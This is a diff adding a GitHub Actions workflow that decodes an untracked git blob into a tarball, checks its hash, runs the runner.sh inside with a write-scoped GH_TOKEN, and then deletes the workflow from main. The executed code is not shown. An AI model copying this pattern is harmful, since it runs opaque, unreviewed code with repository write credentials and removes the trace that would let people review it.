@@ -1,0 +1,55 @@
+name: Phase 2B Closure
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - .github/workflows/phase2b-closure.yml
+
+permissions:
+  contents: write
+
+jobs:
+  verify-and-publish:
+    name: Verify Phase 2B and publish atomically
+    runs-on: ubuntu-24.04
+    timeout-minutes: 180
+    env:
+      GH_TOKEN: ${{ secrets.GH_TOKEN }}
+      PYTHONDONTWRITEBYTECODE: "1"
+    steps:
+      - name: Checkout launcher main
+        uses: actions/checkout@v4
+        with:
+          ref: main
+          fetch-depth: 0
+
+      - name: Materialize exact untracked verification bundle
+        run: |
+          set -euo pipefail
+          if [[ -z "${GH_TOKEN:-}" ]]; then
+            echo "::error::GH_TOKEN repository secret is required"
+            exit 1
+          fi
+          mkdir -p /tmp/phase2b-bundle
+          gh api repos/mohammedmezo99/DeadZone-MEZO/git/blobs/f19b8da92a2c1c29227320bbb37fabbcae10b6c3 --jq .content \
+            | tr -d '\n' | base64 -d > /tmp/phase2b-bundle.tgz
+          printf '%s  %s\n' '62720c863fee8329b5b4c2c773b2c4990544c7cd264a16bb004345887ded74d7' /tmp/phase2b-bundle.tgz | sha256sum -c -
+          tar -xzf /tmp/phase2b-bundle.tgz -C /tmp/phase2b-bundle --no-same-owner
+          chmod 700 /tmp/phase2b-bundle/runner.sh
+          echo "BUNDLE_VERIFIED_SHA256=62720c863fee8329b5b4c2c773b2c4990544c7cd264a16bb004345887ded74d7"
+
+      - name: Execute external Phase 2B authority
+        run: /tmp/phase2b-bundle/runner.sh
+
+      - name: Remove temporary launcher workflow from main
+        if: always()
+        run: |
+          set -euo pipefail
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          if [[ -f .github/workflows/phase2b-closure.yml ]]; then
+            git rm .github/workflows/phase2b-closure.yml
+            git commit -m 'chore: remove temporary Phase 2B verifier'
+            git push origin HEAD:main
+          fi
